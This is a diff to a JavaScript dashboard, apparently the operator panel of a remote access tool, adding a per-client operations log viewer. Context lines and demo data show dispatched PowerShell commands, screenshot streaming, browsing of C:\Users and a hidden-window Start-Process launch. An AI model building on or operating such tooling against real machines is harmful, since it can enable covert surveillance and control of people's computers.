@@ -277,6 +277,9 @@ const RunApp = (() => {
                         FramesApp.handleNewFrame(data);
                     }
                 });
+                dashboardSocket.on('new_operation_log', data => {
+                    handleRealtimeLog(data);
+                });
             } catch {}
         } else if (dashboardSocket.connected && runState.password) {
             dashboardSocket.emit('register_dashboard', { password: runState.password });
@@ -1823,6 +1826,332 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         setupFtpHistoryListener();
     }
 
+    // ═══════════════════════════════════════════════════════════════
+    // OPERATIONS LOG MODULE
+    // ═══════════════════════════════════════════════════════════════
+
+    const logsState = {
+        isOpen: false,
+        user: null,
+        logs: [],
+        filterType: 'ALL',
+        searchQuery: '',
+        isLoading: false
+    };
+    let logsHistoryPushed = false;
+
+    function formatLogTime(timeStr) {
+        if (!timeStr) return '—';
+        try {
+            const parts = timeStr.replace('T', ' ').split(' ');
+            if (parts.length >= 2) {
+                const timePart = parts[1].split('.')[0];
+                const datePart = parts[0];
+                return `${datePart} ${timePart}`;
+            }
+            return timeStr;
+        } catch {
+            return timeStr;
+        }
+    }
+
+    function openLogsModal(user) {
+        const targetUser = user || runState.popupUser;
+        if (!targetUser) return;
+
+        logsState.isOpen = true;
+        logsState.user = targetUser;
+        logsState.searchQuery = '';
+        logsState.filterType = 'ALL';
+
+        const modal = $('logs-modal');
+        if (modal) modal.style.display = 'flex';
+
+        const targetLabel = $('logs-target-user');
+        if (targetLabel) {
+            targetLabel.textContent = `Client: ${getDisplayUsername(targetUser.username)}`;
+        }
+
+        const filterInput = $('logs-filter-input');
+        if (filterInput) filterInput.value = '';
+        const filterClear = $('logs-filter-clear');
+        if (filterClear) filterClear.style.display = 'none';
+
+        document.querySelectorAll('#logs-filter-pills .logs-pill').forEach(pill => {
+            pill.classList.toggle('active', pill.dataset.filter === 'ALL');
+        });
+
+        try {
+            history.pushState({ modal: 'logs', username: targetUser.username }, '');
+            logsHistoryPushed = true;
+        } catch {}
+
+        loadUserLogs(targetUser.username);
+    }
+
+    function closeLogsModal(pushHistory = false) {
+        if (!logsState.isOpen) return;
+        logsState.isOpen = false;
+        const modal = $('logs-modal');
+        if (modal) modal.style.display = 'none';
+
+        if (pushHistory && logsHistoryPushed) {
+            logsHistoryPushed = false;
+            try {
+                history.back();
+            } catch {}
+        } else {
+            logsHistoryPushed = false;
+        }
+    }
+
+    async function loadUserLogs(username, silent = false) {
+        if (!username) return;
+        const targetUser = logsState.user;
+
+        if (targetUser?.demo || !runState.isConnected) {
+            logsState.logs = [
+                {
+                    id: 105,
+                    username: username,
+                    op_type: 'SYSTEM',
+                    details: 'Client registered and active (demo session)',
+                    status: 'online',
+                    created_at: new Date().toISOString().replace('T', ' ').substring(0, 19)
+                },
+                {
+                    id: 104,
+                    username: username,
+                    op_type: 'COMMAND',
+                    details: 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5',
+                    status: 'dispatched',
+                    created_at: new Date(Date.now() - 180000).toISOString().replace('T', ' ').substring(0, 19)
+                },
+                {
+                    id: 103,
+                    username: username,
+                    op_type: 'SPEAK',
+                    details: 'Alert: System operational status confirmed',
+                    status: 'dispatched',
+                    created_at: new Date(Date.now() - 600000).toISOString().replace('T', ' ').substring(0, 19)
+                },
+                {
+                    id: 102,
+                    username: username,
+                    op_type: 'SCREENSHOT',
+                    details: 'Continuous screenshot stream toggled ON',
+                    status: 'success',
+                    created_at: new Date(Date.now() - 1800000).toISOString().replace('T', ' ').substring(0, 19)
+                },
+                {
+                    id: 101,
+                    username: username,
+                    op_type: 'FTP',
+                    details: 'Listed directory contents: C:\\Users',
+                    status: 'success',
+                    created_at: new Date(Date.now() - 3600000).toISOString().replace('T', ' ').substring(0, 19)
+                }
+            ];
+            renderLogsList();
+            return;
+        }
+
+        if (logsState.isLoading) return;
+        logsState.isLoading = true;
+
+        if (!silent) {
+            const list = $('logs-list');
+            if (list) {
+                list.innerHTML = `
+                    <div class="logs-empty-state">
+                        <i class="bi bi-arrow-repeat logs-empty-icon" style="animation: spin 1s linear infinite;"></i>
+                        <div>Loading operations log...</div>
+                    </div>
+                `;
+            }
+        }
+
+        try {
+            const res = await fetch(`${VPS_URL}/api/logs/${encodeURIComponent(username)}?limit=300`, {
+                headers: { 'x-password': runState.password }
+            });
+            if (res.ok) {
+                const data = await res.json();
+                logsState.logs = Array.isArray(data) ? data : [];
+            } else {
+                logsState.logs = [];
+            }
+        } catch (err) {
+            console.error('Failed to load logs:', err);
+            logsState.logs = [];
+        } finally {
+            logsState.isLoading = false;
+            renderLogsList();
+        }
+    }
+
+    function renderLogsList() {
+        const list = $('logs-list');
+        const counter = $('logs-counter');
+        if (!list) return;
+
+        let items = logsState.logs || [];
+
+        if (logsState.filterType && logsState.filterType !== 'ALL') {
+            const fType = logsState.filterType.toUpperCase();
+            items = items.filter(l => (l.op_type || '').toUpperCase() === fType);
+        }
+
+        if (logsState.searchQuery) {
+            const q = logsState.searchQuery.toLowerCase();
+            items = items.filter(l =>
+                (l.details || '').toLowerCase().includes(q) ||
+                (l.op_type || '').toLowerCase().includes(q) ||
+                (l.status || '').toLowerCase().includes(q) ||
+                (l.created_at || '').toLowerCase().includes(q)
+            );
+        }
+
+        if (counter) {
+            const isFiltered = (logsState.filterType && logsState.filterType !== 'ALL') || !!logsState.searchQuery;
+            counter.textContent = `${items.length} log${items.length !== 1 ? 's' : ''}${isFiltered ? ' (filtered)' : ''}`;
+        }
+
+        if (items.length === 0) {
+            const hasFilters = (logsState.filterType && logsState.filterType !== 'ALL') || !!logsState.searchQuery;
+            list.innerHTML = `
+                <div class="logs-empty-state">
+                    <i class="bi bi-journal-x logs-empty-icon"></i>
+                    <div>${hasFilters ? 'No operation logs match your search or filter.' : 'No operation logs recorded yet for this client.'}</div>
+                </div>
+            `;
+            return;
+        }
+
+        const html = items.map(log => {
+            const opType = (log.op_type || 'COMMAND').toUpperCase();
+            const typeClass = `log-type-${escapeHtml(opType)}`;
+            const timeFormatted = formatLogTime(log.created_at);
+            const detailsEsc = escapeHtml(log.details || '');
+            const statusEsc = log.status ? `<div class="log-status-text">${escapeHtml(log.status)}</div>` : '';
+
+            return `
+                <div class="log-entry" data-id="${log.id || ''}">
+                    <div class="log-time" title="${escapeHtml(log.created_at || '')}">${timeFormatted}</div>
+                    <span class="log-type-tag ${typeClass}">${escapeHtml(opType)}</span>
+                    <div class="log-content">
+                        <div class="log-detail-text">${detailsEsc}</div>
+                        ${statusEsc}
+                    </div>
+                    <div class="log-actions">
+                        <button type="button" class="log-copy-btn" title="Copy operation details" data-copy="${encodeURIComponent(log.details || '')}">
+                            <i class="bi bi-clipboard"></i>
+                        </button>
+                    </div>
+                </div>
+            `;
+        }).join('');
+
+        list.innerHTML = html;
+
+        list.querySelectorAll('.log-copy-btn').forEach(btn => {
+            btn.addEventListener('click', e => {
+                e.stopPropagation();
+                const textToCopy = decodeURIComponent(btn.dataset.copy || '');
+                if (!textToCopy) return;
+                navigator.clipboard.writeText(textToCopy).then(() => {
+                    btn.innerHTML = '<i class="bi bi-check2"></i>';
+                    setTimeout(() => { btn.innerHTML = '<i class="bi bi-clipboard"></i>'; }, 1500);
+                }).catch(() => {
+                    alert('Copied: ' + textToCopy);
+                });
+            });
+        });
+    }
+
+    async function clearUserLogs() {
+        const user = logsState.user;
+        if (!user) return;
+        const name = getDisplayUsername(user.username);
+        if (!confirm(`Are you sure you want to clear all operation logs for ${name}?`)) return;
+
+        if (user.demo || !runState.isConnected) {
+            logsState.logs = [];
+            renderLogsList();
+            return;
+        }
+
+        try {
+            const res = await fetch(`${VPS_URL}/api/logs/${encodeURIComponent(user.username)}/clear`, {
+                method: 'POST',
+                headers: { 'x-password': runState.password }
+            });
+            if (res.ok) {
+                logsState.logs = [];
+                renderLogsList();
+            } else {
+                alert('Failed to clear logs on server.');
+            }
+        } catch (err) {
+            alert('Error clearing logs: ' + err.message);
+        }
+    }
+
+    function handleRealtimeLog(data) {
+        if (!data || !data.username) return;
+        if (logsState.isOpen && logsState.user && logsState.user.username === data.username) {
+            if (!logsState.logs.some(l => l.id === data.id)) {
+                logsState.logs.unshift(data);
+                renderLogsList();
+            }
+        }
+    }
+
+    function initLogsModal() {
+        $('logs-close-btn')?.addEventListener('click', () => closeLogsModal(true));
+        $('logs-refresh-btn')?.addEventListener('click', () => {
+            if (logsState.user) loadUserLogs(logsState.user.username, false);
+        });
+        $('logs-clear-btn')?.addEventListener('click', clearUserLogs);
+
+        const filterInput = $('logs-filter-input');
+        const filterClear = $('logs-filter-clear');
+        if (filterInput) {
+            filterInput.addEventListener('input', e => {
+                logsState.searchQuery = e.target.value.trim();
+                if (filterClear) filterClear.style.display = logsState.searchQuery ? 'block' : 'none';
+                renderLogsList();
+            });
+        }
+
+        filterClear?.addEventListener('click', () => {
+            if (filterInput) filterInput.value = '';
+            logsState.searchQuery = '';
+            filterClear.style.display = 'none';
+            renderLogsList();
+            filterInput?.focus();
+        });
+
+        document.querySelectorAll('#logs-filter-pills .logs-pill').forEach(pill => {
+            pill.addEventListener('click', () => {
+                document.querySelectorAll('#logs-filter-pills .logs-pill').forEach(p => p.classList.remove('active'));
+                pill.classList.add('active');
+                logsState.filterType = pill.dataset.filter || 'ALL';
+                renderLogsList();
+            });
+        });
+
+        $('logs-modal')?.addEventListener('click', e => {
+            if (e.target === $('logs-modal')) closeLogsModal(true);
+        });
+
+        window.addEventListener('popstate', e => {
+            if (logsState.isOpen && (!e.state || e.state.modal !== 'logs')) {
+                closeLogsModal(false);
+            }
+        });
+    }
+
     // ── Send Command / Fetch Data ──
     async function doSendPopup() {
         if (isSendingCommand) return;
@@ -1876,13 +2205,8 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
     }
 
     async function doViewOutput(user) {
-        if (user?.demo || !runState.isConnected) {
-            const out = `[demo] ${user.username}\nstatus: preview only\nlast action: none (connect to enable live output)`;
-            navigator.clipboard.writeText(out).catch(() => {});
-            alert(out);
-            return;
-        }
-        alert(`[${getDisplayUsername(user.username)}]\nCommand output capture is not yet available.`);
+        if (!user) return;
+        openLogsModal(user);
     }
 
     async function fetchData() {
@@ -2107,9 +2431,13 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         if ($('upload-btn')) $('upload-btn').onclick = () => $('file-upload')?.click();
         $('update-client-btn')?.addEventListener('click', doSendUpdateClient);
         $('ftp-browser-btn')?.addEventListener('click', openFtpBrowser);
+        $('user-logs-btn')?.addEventListener('click', () => {
+            if (runState.popupUser) openLogsModal(runState.popupUser);
+        });
         $('enable-screenshot-btn')?.addEventListener('click', doToggleEnableScreenshot);
         $('delete-screenshots-btn')?.addEventListener('click', doDeleteAllScreenshots);
         initFtpBrowser();
+        initLogsModal();
 
         const fileUpload = $('file-upload');
         if (fileUpload) {
@@ -2135,6 +2463,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
 
         // Global keyboard shortcuts
         document.addEventListener('keydown', e => {
+            if (logsState.isOpen) {
+                if (e.key === 'Escape') {
+                    closeLogsModal(true);
+                    return;
+                }
+            }
             if (ftpState.isOpen) {
                 if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'S')) {
                     e.preventDefault();
